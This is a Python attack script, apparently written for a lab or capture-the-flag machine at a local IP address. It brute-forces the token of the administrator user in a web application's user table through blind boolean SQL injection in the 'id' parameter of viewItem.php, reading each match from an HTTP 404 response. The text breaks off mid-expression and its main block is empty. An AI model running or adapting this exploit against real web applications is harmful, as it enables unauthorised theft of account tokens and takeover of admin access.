 #!/usr/bin/python3
 
 from pwn import *
 
 import requests, signal, sys, time
 
 def def_handler(sig, frame):
     print("\n\nExit")
     sys.exit(1)
 
 # Ctrl+C
 signal.signal(signal.SIGINT, def_handler)
 
 # Variables Globales
 main_url = "http://192.168.1.4/item/viewItem.php"
 characters = string.ascii_letters + string.digits
 
 def makeSQLI():
 
     p1 = log.progress("Brute Force")
     p1.status("Startin Force Brute Attack")
 
     time.sleep(2)
 
     p2 = log.progress("token")
 
     token = ""
 
     for position in range(1 ,50):
         for character in characters:
         
             sqliURL = main_url + "?id=5 or (select(select  ascii(substring(token,%d,1)) from user where id_level = 1)=%d);" %(position, ord(charac
             p1.status(sqliURL)
 
             r = requests.get(sqliURL) 
 
             if r.status_code == 404:
                 token += character
                 p2.status(token)
                 break
 
 if __name__ == '__main__':
